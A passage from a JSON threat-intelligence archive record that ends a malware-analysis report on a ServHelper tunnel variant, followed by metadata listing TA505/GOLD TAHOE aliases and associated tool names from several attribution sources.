accounts)\n\n**References:**\n\nServHelper and FlawedGrace – New malware introduced by TA505\n\n(January 9, 2019 – Proofpoint)\n\nhttps://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malwareintroduced-ta505\n\n### About the Author\n\nJames Quinn is a Threat Researcher and Malware Analyst for Binary Defense. When he is\nnot working at Binary Defense, he works as a freelance malware analyst and participates in\nsecurity intelligence sharing groups. James is a major contributor to research of the Emotet\nbotnet with the Cryptolaemus security researcher group.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-12-20 - An Updated ServHelper Tunnel Variant.pdf"
    ],
    "report_names": [
        "2019-12-20 - An Updated ServHelper Tunnel Variant.pdf"
    ],
    "threat_actors": [
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536194,
    "ts_updated_at": 1743041738,
    "ts_creation_date": 1653760083,
    "ts_modification_date": 1653760083,
    "files": {
        "pdf": "https://archive.orkl.eu/724e74e44a27f674eab5cbdf7fa062fe3356368b.pdf",
        "text": "https://archive.orkl.eu/724e74e44a27f674eab5cbdf7fa062fe3356368b.txt",
        "img": "https://archive.orkl.eu/724e74e44a27f674eab5cbdf7fa062fe3356368b.jpg"
    }
}